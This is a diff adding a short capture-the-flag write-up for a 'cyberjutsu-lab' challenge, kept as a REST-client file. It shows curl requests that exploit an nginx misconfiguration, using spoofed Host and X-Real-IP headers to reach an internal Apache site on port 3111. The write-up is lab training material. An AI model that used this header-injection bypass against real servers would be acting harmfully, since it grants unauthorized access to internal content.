@@ -1,0 +1,19 @@
+# To quickly curl from this file, use this extension on VSCode: https://marketplace.visualstudio.com/items?itemName=humao.rest-client
+
+# quick writeup
+# docker command makes the apache listen to 0.0.0.0:3111 from host, which is broadcast
+# we can now curl to apache /var/www/html site
+
+###
+curl 'http://devops.kid.cyberjutsu-lab.tech:3111/'
+# It works!
+
+# but the target we want is /var/www/internal in apache
+# nginx misconfig, so you can do Host Header Injection: https://serverfault.com/questions/1029537/how-to-prevent-host-header-injection-vulnerability-in-nginx-proxy-server
+# we can target the 3111 port and inject the Host & X-Real-IP header
+###
+curl 'http://devops.kid.cyberjutsu-lab.tech:3111/' \
+  -H 'X-Real-IP: 1.3.3.7' \
+  -H 'Host: internal.kid.cyberjutsu-lab.tech' \
+  --compressed \
+  --insecure
